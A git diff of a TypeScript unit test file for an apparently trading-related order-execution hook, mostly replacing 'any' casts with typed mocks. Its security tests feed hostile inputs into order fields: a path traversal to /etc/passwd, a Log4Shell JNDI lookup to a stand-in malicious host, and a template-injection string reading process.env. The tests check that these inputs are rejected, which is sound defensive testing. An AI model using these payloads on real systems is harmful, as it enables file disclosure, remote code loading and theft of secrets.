@@ -15,21 +15,57 @@ import { act, renderHook } from '@testing-library/react';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 
 // Type definitions for mocks
+interface EdgeFunctionResponse {
+  success: boolean;
+  data?: {
+    data: {
+      order_id: string;
+      position_id?: string;
+      status: string;
+      execution_details: {
+        execution_price: string;
+        slippage?: string;
+        commission: string;
+        total_cost: string;
+        timestamp: string;
+        transaction_id?: string;
+      };
+    };
+  };
+  error?: {
+    code: string;
+    message: string;
+    details?: Record<string, unknown>;
+    status: number;
+  };
+}
+
 type MockExecuteWithIdempotency = (
   key: string,
   endpoint: string,
-  fn: () => Promise<any>
-) => Promise<any>;
+  fn: () => Promise<EdgeFunctionResponse>
+) => Promise<EdgeFunctionResponse>;
+
 type MockRateLimiterExecute = (
   key: string,
-  fn: () => Promise<any>,
+  fn: () => Promise<EdgeFunctionResponse>,
   priority?: number
-) => Promise<any>;
+) => Promise<EdgeFunctionResponse>;
+
 type MockCheckRateLimit = (type: string) => {
   allowed: boolean;
   remaining: number;
   resetIn: number;
 };
+
+interface MockSession {
+  data: {
+    session: {
+      user: { id: string };
+      access_token: string;
+    } | null;
+  };
+}
 
 // Mock all dependencies
 vi.mock('@/lib/supabaseBrowserClient', () => ({
@@ -98,7 +134,7 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Input Validation and Sanitization', () => {
     it('should validate and sanitize all input parameters correctly', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -107,14 +143,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -166,7 +202,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should reject invalid symbols with security warnings', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -175,7 +211,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
@@ -201,7 +237,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should handle edge cases in quantity validation', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -210,7 +246,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
@@ -256,7 +292,7 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Rate Limiting and Idempotency Protection', () => {
     it('should enforce rate limits correctly', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -265,7 +301,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: false,
         remaining: 0,
@@ -289,7 +325,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should generate unique idempotency keys for different orders', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -298,14 +334,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -350,7 +386,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should prevent duplicate orders using idempotency', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -359,14 +395,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
 
       // Simulate idempotency failure (duplicate order)
@@ -395,7 +431,7 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Transaction Integrity and Atomic Execution', () => {
     it('should handle successful atomic transaction execution', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -405,6 +441,7 @@ describe('Order Execution Flow - Unit Tests', () => {
       };
 
       const mockExecutionResult = {
+        success: true,
         data: {
           data: {
             order_id: 'order-123',
@@ -422,14 +459,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue(mockExecutionResult);
 
@@ -454,7 +491,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should handle transaction rollback on partial failure', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -463,14 +500,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockRejectedValue(
         new Error('Database constraint violation')
@@ -496,7 +533,7 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Error Handling and User Feedback', () => {
     it('should provide appropriate error messages for different error types', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -505,7 +542,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       const { result } = renderHook(() => useOrderExecution());
 
@@ -516,7 +553,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockRejectedValue(
         new Error('INSUFFICIENT_MARGIN: Insufficient margin for this order')
@@ -533,10 +570,8 @@ describe('Order Execution Flow - Unit Tests', () => {
       });
 
       // Test authentication error
-      const authErrorSession = { data: { session: null } };
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(
-        authErrorSession as any
-      );
+      const authErrorSession: MockSession = { data: { session: null } };
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(authErrorSession);
 
       await act(async () => {
         const response = await result.current.executeOrder({
@@ -550,7 +585,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should handle network failures gracefully', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -559,14 +594,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockRejectedValue(
         new Error('Network timeout')
@@ -588,7 +623,7 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Performance Requirements (<500ms)', () => {
     it('should complete order execution within performance budget', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -597,14 +632,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -642,7 +677,7 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should handle concurrent order submissions efficiently', async () => {
-      const mockSession = {
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
@@ -651,14 +686,14 @@ describe('Order Execution Flow - Unit Tests', () => {
         },
       };
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession as any);
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
         remaining: 99,
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -708,16 +743,18 @@ describe('Order Execution Flow - Unit Tests', () => {
       const mockInvalidateQueries = vi.fn();
       vi.mocked(useQueryClient).mockReturnValue({
         invalidateQueries: mockInvalidateQueries,
-      } as any);
+      });
 
-      vi.mocked(supabase.auth.getSession).mockResolvedValue({
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
             access_token: 'mock-token',
           },
         },
-      } as any);
+      };
+
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
@@ -725,7 +762,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -768,14 +805,16 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Security Validation', () => {
     it('should generate and use CSRF tokens for order operations', async () => {
-      vi.mocked(supabase.auth.getSession).mockResolvedValue({
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
             access_token: 'mock-token',
           },
         },
-      } as any);
+      };
+
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
@@ -783,7 +822,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -825,14 +864,16 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should validate all input parameters for security threats', async () => {
-      vi.mocked(supabase.auth.getSession).mockResolvedValue({
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
             access_token: 'mock-token',
           },
         },
-      } as any);
+      };
+
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       const { result } = renderHook(() => useOrderExecution());
 
@@ -854,7 +895,7 @@ describe('Order Execution Flow - Unit Tests', () => {
           order_type: 'limit',
           side: 'buy',
           quantity: 1.0,
-          price: '../../../etc/passwd' as any,
+          price: '../../../etc/passwd' as unknown as number,
         });
         expect(response).toBeNull();
       });
@@ -866,7 +907,7 @@ describe('Order Execution Flow - Unit Tests', () => {
           order_type: 'market',
           side: 'buy',
           quantity: 1.0,
-          stop_loss: '${jndi:ldap://malicious.com/a}' as any,
+          stop_loss: '${jndi:ldap://malicious.com/a}' as unknown as number,
         });
         expect(response).toBeNull();
       });
@@ -879,7 +920,7 @@ describe('Order Execution Flow - Unit Tests', () => {
           side: 'buy',
           quantity: 1.0,
           take_profit:
-            '{{constructor.constructor("return process.env")()}}' as any,
+            '{{constructor.constructor("return process.env")()}}' as unknown as number,
         });
         expect(response).toBeNull();
       });
@@ -888,14 +929,16 @@ describe('Order Execution Flow - Unit Tests', () => {
 
   describe('Edge Cases and Boundary Conditions', () => {
     it('should handle extremely fast consecutive orders', async () => {
-      vi.mocked(supabase.auth.getSession).mockResolvedValue({
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
             access_token: 'mock-token',
           },
         },
-      } as any);
+      };
+
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
@@ -903,7 +946,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
@@ -946,14 +989,16 @@ describe('Order Execution Flow - Unit Tests', () => {
     });
 
     it('should handle 100 sequential executions efficiently', async () => {
-      vi.mocked(supabase.auth.getSession).mockResolvedValue({
+      const mockSession: MockSession = {
         data: {
           session: {
             user: { id: 'user-123' },
             access_token: 'mock-token',
           },
         },
-      } as any);
+      };
+
+      vi.mocked(supabase.auth.getSession).mockResolvedValue(mockSession);
 
       vi.mocked(checkRateLimit).mockReturnValue({
         allowed: true,
@@ -961,7 +1006,7 @@ describe('Order Execution Flow - Unit Tests', () => {
         resetIn: 0,
       });
       vi.mocked(rateLimiter.execute).mockImplementation(
-        async (_: unknown, fn: () => Promise<any>) => fn()
+        async (_: unknown, fn: () => Promise<EdgeFunctionResponse>) => fn()
       );
       vi.mocked(executeWithIdempotency).mockResolvedValue({
         data: {
